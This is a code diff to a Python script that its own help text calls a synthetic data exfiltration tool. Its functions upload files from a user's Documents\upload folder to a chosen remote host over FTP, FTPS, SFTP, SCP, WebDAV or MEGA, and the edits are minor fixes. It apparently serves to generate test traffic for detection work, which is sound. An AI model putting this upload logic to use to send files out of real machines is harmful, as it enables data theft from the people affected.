@@ -28,7 +28,6 @@ def ftpExfiltration(host, user, passwd, fileList):
         for filename in fileList: 
             ftp.storbinary('STOR ' + filename, open(filename, 'rb'))
         
-        # ftp.dir()
         ftp.quit()
 
     return
@@ -60,7 +59,7 @@ def sftpExfiltration(host, user, passwd, fileList):
        
         logging.debug('SFTP connection, host %s, user: %s', host, user)
        
-        sftp.chdir('./sftp')
+        # sftp.chdir('./sftp')
         for filename in fileList: 
             sftp.put(filename)
 
@@ -99,7 +98,9 @@ def scpExfiltration(host, user, passwd, source, fileList):
             logging.debug('SCP connection, host %s, user: %s', host, user)
        
             for filename in fileList: 
-                scp.put(source+'\\'+filename, remote_path='./scp')
+                # Remove requirement for host to have an scp directory
+                # scp.put(source+'\\'+filename, remote_path='./scp')
+                scp.put(source+'\\'+filename)
         
             # logging.debug('SCP host file list (first 10 files): %s', ssh.exec_command('ls'))
 
@@ -190,7 +191,7 @@ def dataExfiltration(protocol, host, user, passwd, source, include):
             megaExfiltration(user, passwd, fileList)
         case _:
             print(protocol,' not implemented')
-            # raise NotImplementedError('Not implemented')
+            raise NotImplementedError('Not implemented')
 
     os.chdir(startDirectory)
 
@@ -200,7 +201,7 @@ if __name__ == '__main__':
     # define comamnd line arguemnts
     parser = argparse.ArgumentParser(description="Synthetic data exfiltration tool. Specify a protocol and a target host and the script " \
                                      "will copy files from the .\\Documents\\upload folder. The include option can be used to used to specify a file " \
-                                     "of extensions to use as an include filter. For FTPS the server must have TLS session resue = no.")
+                                     "of extensions to use as an include filter. For FTPS the server must have TLS session reuse = no.")
     parser.add_argument('protocol',
                         help='Specify the protocol to be used: FTP, FTPS, SFTP, WebDAV, SCP or MEGA',
                         type=str.lower,
@@ -211,7 +212,7 @@ if __name__ == '__main__':
                         )
     parser.add_argument('--user',
                         '-l', 
-                        help='Optional, specify the login name or email. Anonymous will be used if not specifieed',
+                        help='Optional, specify the login name or email. Anonymous will be used if not specified',
                         type=str
                         )
     parser.add_argument('--passwd',
@@ -252,7 +253,7 @@ if __name__ == '__main__':
         logging.debug('No file type filter file specified')
 
     # source simply defaults to %USERPROFILE%\Documents\upload at the moment
-    source =''
+    source = ''
 
     dataExfiltration(args.protocol, args.host, args.user,args.passwd, source, args.include)
 
